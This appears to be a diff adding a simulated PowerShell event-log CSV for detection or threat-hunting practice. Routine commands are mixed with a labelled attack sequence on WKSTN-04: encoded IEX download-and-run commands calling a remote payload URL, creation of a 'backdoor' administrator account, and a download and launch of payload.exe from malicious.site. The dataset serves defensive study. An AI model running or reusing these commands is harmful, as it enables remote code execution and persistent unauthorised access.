@@ -1,0 +1,17 @@
+time,host,user,src_ip,process,parent_process,command_line,encoded,EventCode,status,description
+2026-04-08 09:00:00,WKSTN-01,jsmith,192.168.1.25,powershell.exe,explorer.exe,Get-Process,false,4103,success,Normal PowerShell execution
+2026-04-08 09:05:00,WKSTN-01,jsmith,192.168.1.25,powershell.exe,explorer.exe,Get-Service,false,4103,success,Normal PowerShell execution
+2026-04-08 09:10:00,WKSTN-02,mwilliams,192.168.1.33,powershell.exe,explorer.exe,Get-EventLog -LogName Security,false,4103,success,Normal PowerShell execution
+2026-04-08 09:15:00,WKSTN-03,tbrady,192.168.1.40,powershell.exe,explorer.exe,Set-ExecutionPolicy Unrestricted,false,4103,warning,Execution policy changed
+2026-04-08 09:20:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQBpAGMAYQByAC4AcAB3AC8AcABhAHkAbABvAGEAZAAnACkA,true,4104,success,Encoded PowerShell command executed
+2026-04-08 09:21:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQBpAGMAYQByAC4AcAB3AC8AcABhAHkAbABvAGEAZAAnACkA,true,4104,success,Encoded PowerShell command executed
+2026-04-08 09:22:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQBpAGMAYQByAC4AcAB3AC8AcABhAHkAbABvAGEAZAAnACkA,true,4104,success,Encoded PowerShell command executed
+2026-04-08 09:23:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,New-LocalUser -Name backdoor -Password P@ssw0rd123,false,4104,success,New local user created
+2026-04-08 09:25:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,Add-LocalGroupMember -Group Administrators -Member backdoor,false,4104,success,User added to Administrators group
+2026-04-08 09:27:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,Invoke-WebRequest -Uri http://malicious.site/payload.exe -OutFile C:\Windows\Temp\payload.exe,false,4104,success,File downloaded from internet
+2026-04-08 09:30:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,Start-Process C:\Windows\Temp\payload.exe,false,4104,success,Malicious executable launched
+2026-04-08 09:35:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,Get-LocalUser,false,4103,success,User enumeration
+2026-04-08 09:40:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,Get-NetIPConfiguration,false,4103,success,Network reconnaissance
+2026-04-08 09:45:00,WKSTN-04,admin,192.168.1.10,powershell.exe,cmd.exe,Get-Process | Where-Object {$_.CPU -gt 10},false,4103,success,Process enumeration
+2026-04-08 10:00:00,WKSTN-05,service_acc,192.168.1.50,powershell.exe,services.exe,Start-Service -Name WinRM,false,4103,success,Normal service management
+2026-04-08 10:05:00,WKSTN-02,mwilliams,192.168.1.33,powershell.exe,explorer.exe,Get-ChildItem C:\Users,false,4103,success,Normal directory listing
